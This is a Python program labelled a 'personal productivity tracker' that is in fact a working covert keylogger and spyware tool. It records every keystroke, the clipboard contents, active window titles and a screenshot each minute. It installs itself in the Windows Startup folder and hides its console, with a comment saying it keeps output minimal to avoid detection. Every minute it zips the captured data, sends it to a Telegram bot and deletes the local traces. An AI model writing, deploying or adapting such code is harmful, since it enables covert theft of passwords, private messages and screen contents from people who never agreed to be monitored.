import threading
import time
import os
import pygetwindow as gw
from PIL import ImageGrab
import pyperclip
from pynput import keyboard
from datetime import datetime
import requests
import zipfile
import shutil
import sys

# Global log file and variables
LOG_FILE = "productivity_log.txt"
current_line = ""  # Buffer for current line of text
last_log_type = ""  # Track the last type of log entry

# Telegram configuration
BOT_TOKEN = "TEL_BOT_TOKEN"
CHAT_ID = "TEL_CHAT_ID"  # Your chat ID from the response

def copy_to_startup():
    """Copy the program to startup folder if not already there"""
    try:
        # Get the current script path
        current_script = os.path.abspath(sys.argv[0])
        script_name = os.path.basename(current_script)
        
        # Get startup folder path
        if os.name == 'nt':  # Windows
            startup_folder = os.path.join(os.path.expanduser('~'), 
                                         'AppData', 'Roaming', 
                                         'Microsoft', 'Windows', 
                                         'Start Menu', 'Programs', 
                                         'Startup')
        else:  # Linux/Mac (for completeness)
            startup_folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        
        # Create startup folder if it doesn't exist
        os.makedirs(startup_folder, exist_ok=True)
        
        startup_script = os.path.join(startup_folder, script_name)
        
        # Check if already in startup folder
        if os.path.abspath(os.path.dirname(current_script)) == os.path.abspath(startup_folder):
            print("[+] Already running from startup folder")
            return True
            
        # Check if already exists in startup folder
        if os.path.exists(startup_script):
            print("[+] Already exists in startup folder")
            return True
            
        # Copy to startup folder
        shutil.copy2(current_script, startup_script)
        print(f"[+] Copied to startup folder: {startup_script}")
        return True
        
    except Exception as e:
        print(f"[-] Error copying to startup: {e}")
        return False

def silent_print(message):
    """Only print critical messages to avoid detection"""
    critical_messages = ["ERROR", "Started", "Stopped", "sent via Telegram"]
    if any(critical in message for critical in critical_messages):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

def hide_console():
    """Hide the console window using different methods"""
    try:
        # Method 1: Try using ctypes (works on Windows without extra installs)
        if os.name == 'nt':  # Windows
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)  # SW_HIDE = 0
                
    except Exception:
        # Method 2: If all else fails, just minimize the window
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # SW_MINIMIZE = 6
        except Exception:
            pass

def send_files_via_telegram():
    """Send files via Telegram bot and delete after sending"""
    try:
        # Check if there are any files to send
        has_log_file = os.path.exists("productivity_log.txt") and os.path.getsize("productivity_log.txt") > 200
        has_screenshots = os.path.exists("screenshots") and any(file.endswith('.png') for file in os.listdir("screenshots"))
        
        if not has_log_file and not has_screenshots:
            return False
        
        # Create zip file
        zip_filename = f"productivity_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            # Add log file
            if has_log_file:
                zipf.write("productivity_log.txt")
            
            # Add screenshots
            if has_screenshots:
                for file in os.listdir("screenshots"):
                    if file.endswith(".png"):
                        zipf.write(os.path.join("screenshots", file))
        
        # Send document via Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open(zip_filename, 'rb') as file:
            files = {'document': file}
            data = {
                'chat_id': CHAT_ID,
                'caption': f'Productivity Data - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            }
            response = requests.post(url, files=files, data=data, timeout=30)
        
        if response.status_code == 200:
            silent_print("Files sent via Telegram successfully")
            
            # Delete files after successful send
            delete_sent_files()
            
            # Remove zip file
            os.remove(zip_filename)
            return True
        else:
            # Don't delete files if sending failed
            if os.path.exists(zip_filename):
                os.remove(zip_filename)
            return False
            
    except Exception as e:
        return False

def delete_sent_files():
    """Delete log file and screenshots after successful send"""
    try:
        # Delete log file
        if os.path.exists("productivity_log.txt"):
            os.remove("productivity_log.txt")
        
        # Delete screenshots folder
        if os.path.exists("screenshots"):
            shutil.rmtree("screenshots")
            
        # Reinitialize log file for new data
        initialize_log()
        
    except Exception as e:
        pass

def send_data_periodically(interval=60):  # 1 minute = 60 seconds
    """Periodically send data every 1 minute"""
    while True:
        time.sleep(interval)
        try:
            send_files_via_telegram()
        except Exception as e:
            pass

def write_to_log(message, log_type="INFO"):
    """Writes a timestamped message to the log file with structured formatting."""
    global current_line, last_log_type
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Format based on log type
    if log_type == "KEYPRESS":
        # For keypresses, accumulate characters and log each update
        if message.startswith("Key pressed:"):
            char = message.replace("Key pressed: ", "")
            current_line += char
            
            # Log the current accumulated text
            log_entry = f"[{timestamp}] [TYPING] {current_line}\n"
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
        elif message.startswith("Special key pressed:"):
            special_key = message.replace("Special key pressed: ", "")
            
            # Handle special keys
            if special_key in ["Key.space"]:
                # Log space as a separate action
                space_entry = f"[{timestamp}] [ACTION] Space Key\n"
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(space_entry)
                
                # Add space to current line and continue
                current_line += " "
                
            elif special_key in ["Key.enter", "Key.return"]:
                # Log enter as action and reset current line
                enter_entry = f"[{timestamp}] [ACTION] Enter/Return pressed\n"
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(enter_entry)
                current_line = ""  # Reset the line buffer
                
            elif special_key == "Key.backspace":
                # Handle backspace
                if current_line:
                    current_line = current_line[:-1]
                    # Log the updated text after backspace
                    if current_line:  # If there's still text
                        log_entry = f"[{timestamp}] [TYPING] {current_line}\n"
                    else:  # If line is now empty
                        log_entry = f"[{timestamp}] [TYPING] [empty]\n"
                    
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(log_entry)
                else:
                    # Log backspace on empty line
                    log_entry = f"[{timestamp}] [ACTION] Backspace on empty line\n"
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(log_entry)
            
            else:
                # Log other special keys as actions
                log_entry = f"[{timestamp}] [ACTION] {special_key}\n"
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(log_entry)
    
    else:
        # For non-keypress logs, write immediately with appropriate category
        if log_type == "WINDOW":
            category = "WINDOW"
        elif log_type == "CLIPBOARD":
            category = "CLIPBOARD"
        elif log_type == "SCREENSHOT":
            category = "SCREENSHOT"
        elif log_type == "SYSTEM":
            category = "SYSTEM"
        else:
            category = "INFO"
        
        # Add separator if switching between different log types
        separator = ""
        if last_log_type and last_log_type != category and last_log_type != "KEYPRESS":
            separator = "-" * 80 + "\n"
        
        log_entry = f"{separator}[{timestamp}] [{category}] {message}\n"
        
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            if separator:
                f.write(separator)
            f.write(log_entry)
        
        last_log_type = category

def flush_current_line():
    """Flushes any remaining text in the current line buffer."""
    global current_line
    if current_line:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [TYPING] {current_line}\n"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
        current_line = ""

def initialize_log():
    """Initializes the log file with a header."""
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("=== PERSONAL PRODUCTIVITY TRACKER LOG ===\n")
        f.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

def capture_screen(interval=60):
    """Takes screenshots every `interval` seconds."""
    os.makedirs("screenshots", exist_ok=True)
    while True:
        time.sleep(interval)
        try:
            screenshot = ImageGrab.grab()
            filename = os.path.join("screenshots", f"screenshot_{int(time.time())}.png")
            screenshot.save(filename)
            message = f"Screenshot saved as {filename}"
            write_to_log(message, "SCREENSHOT")
        except Exception as e:
            error_message = f"Screenshot error: {str(e)}"
            write_to_log(error_message, "SYSTEM")

def track_active_window(interval=5):
    """Tracks which window is currently active."""
    previous_window = None
    while True:
        time.sleep(interval)
        try:
            current_window = gw.getActiveWindowTitle()
            if current_window and current_window != previous_window:
                previous_window = current_window
                # Truncate long window titles for better readability
                display_window = current_window[:80] + "..." if len(current_window) > 80 else current_window
                message = f"Active window: {display_window}"
                write_to_log(message, "WINDOW")
        except Exception as e:
            error_message = f"Window tracking error: {str(e)}"
            write_to_log(error_message, "SYSTEM")

def monitor_clipboard(interval=10):
    """Tracks clipboard changes for personal use."""
    last_clip = ""
    while True:
        time.sleep(interval)
        try:
            current_clip = pyperclip.paste()
            if current_clip and current_clip != last_clip:
                # Only log if content is not empty and has changed
                last_clip = current_clip
                # Truncate long clipboard content for readability
                if len(current_clip) > 100:
                    display_clip = current_clip[:100] + "..."
                    message = f"Clipboard content ({len(current_clip)} chars): {display_clip}"
                else:
                    message = f"Clipboard content: {current_clip}"
                write_to_log(message, "CLIPBOARD")
        except Exception as e:
            error_message = f"Clipboard monitoring error: {str(e)}"
            write_to_log(error_message, "SYSTEM")

def on_press(key):
    """Handles keyboard key press events."""
    try:
        if hasattr(key, 'char') and key.char:
            message = f"Key pressed: {key.char}"
            write_to_log(message, "KEYPRESS")
        else:
            message = f"Special key pressed: {key}"
            write_to_log(message, "KEYPRESS")
    except Exception as e:
        error_message = f"Keyboard listener error: {str(e)}"
        write_to_log(error_message, "SYSTEM")

def start_keyboard_listener():
    """Starts the keyboard listener in a separate thread."""
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def main():
    # Copy to startup folder on first run
    copy_to_startup()
    
    # Hide console window
    hide_console()
    
    # Minimal startup message
    silent_print("System monitor started")
    
    # Initialize log file
    initialize_log()
    write_to_log("Productivity tracker started", "SYSTEM")
    
    # Send initial data immediately
    send_files_via_telegram()
    
    # Start monitoring threads
    threads = [
        threading.Thread(target=capture_screen, daemon=True),
        threading.Thread(target=track_active_window, daemon=True),
        threading.Thread(target=monitor_clipboard, daemon=True)
    ]
    for t in threads:
        t.start()

    # Start keyboard listener
    write_to_log("Keyboard listener started", "SYSTEM")
    keyboard_listener = start_keyboard_listener()
    
    # Start Telegram sender thread (every 1 minute)
    send_thread = threading.Thread(target=send_data_periodically, daemon=True)
    send_thread.start()
    write_to_log("Telegram auto-sender started (1-minute intervals)", "SYSTEM")

    # Keep main thread alive silently
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Flush any remaining text before exiting
        flush_current_line()
        
        # Send final data before exiting
        send_files_via_telegram()
        
        write_to_log("Productivity tracker stopped by user", "SYSTEM")
        silent_print("System monitor stopped")
        keyboard_listener.stop()

if __name__ == "__main__":
    # Run as background process

    main()
